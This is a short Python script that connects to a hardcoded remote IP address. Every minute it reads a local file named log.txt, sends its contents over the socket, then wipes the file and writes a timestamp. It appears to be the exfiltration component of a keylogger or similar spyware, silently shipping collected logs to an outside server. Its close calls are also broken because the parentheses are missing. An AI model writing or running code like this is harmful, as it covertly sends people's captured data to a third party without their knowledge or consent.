import socket
import time
from datetime import date

s = socket.socket()
host = '18.191.243.161'
port = 5050

s.connect((host,port))
while True:
    time.sleep(60)
    
    f = open('./log.txt', 'rb')
    print ('opening and sending')
    l = f.read(1024)

    while(l):
        print ('Sending...')
        s.send(l)
        l = f.read(1024)

    f.close
    f = open('./log.txt','w')
    f.write('\n\nlog sent at ' + str(date.today()) )

    f.close

s.close
